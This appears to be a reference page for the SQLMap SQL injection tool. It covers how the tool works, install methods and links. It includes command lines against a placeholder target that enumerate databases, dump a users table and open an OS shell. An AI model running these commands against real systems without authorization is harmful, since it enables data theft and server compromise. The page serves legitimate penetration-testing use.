# SQLMap — SQL Injection Automation

Automatic SQL injection detection and exploitation tool. Full database takeover across all major DBMS. 6+ injection types, tamper scripts.

## How It Works

SQLMap detects and exploits SQLi through:

- **Detection** — Send payloads, analyze response for error patterns, boolean differences, timing delays, OOB interactions
- **Enumeration** — Extract database structure: DBMS version, databases, tables, columns, data
- **Exploitation** — Read files, write shell, execute commands (via `xp_cmdshell` on MSSQL, INTO OUTFILE on MySQL, COPY on PostgreSQL)

**Injection types:** Boolean-based blind, time-based blind, error-based, UNION query, stacked queries, out-of-band (DNS/HTTP).

**DBMS support:** MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, IBM DB2, Firebird, Sybase, SAP MaxDB, MariaDB, MemSQL, CockroachDB, HSQLDB, H2, MonetDB.

## Manual

```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1"

# Always use risk/level defaults first, then escalate
sqlmap -u "https://target.com/page?id=1" --risk=3 --level=5

# GET parameter
sqlmap -u "https://target.com/api/user?id=1"

# POST with body
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# Auth + cookie
sqlmap -u "https://target.com/page" --cookie="session=abc123"

# Enumerate databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "https://target.com/page?id=1" -D mydb --tables

# Dump table
sqlmap -u "https://target.com/page?id=1" -D mydb -T users --dump

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# Request file for complex setups
sqlmap -r request.txt
```

## Build

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
# Python 3 — no build needed
ln -s $(pwd)/sqlmap.py /usr/local/bin/sqlmap
```

## Install

```bash
# Debian/Ubuntu
sudo apt install sqlmap

# macOS
brew install sqlmap

# Arch
sudo pacman -S sqlmap

# Git (latest)
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev && python3 sqlmap.py

# Python pip
pip3 install sqlmap
```

## Package

| Manager | Command |
|---------|---------|
| DEB | `apt install sqlmap` |
| Brew | `brew install sqlmap` |
| Pacman | `pacman -S sqlmap` |
| Pip | `pip3 install sqlmap` |
| Git | GitHub clone (no build) |

## Links

| Resource | URL |
|----------|-----|
| Official site | https://sqlmap.org/ |
| GitHub | https://github.com/sqlmapproject/sqlmap |
| Docs | https://github.com/sqlmapproject/sqlmap/wiki |
| User manual | https://github.com/sqlmapproject/sqlmap/wiki/Usage |
| Tamper scripts | https://github.com/sqlmapproject/sqlmap/tree/master/tamper |
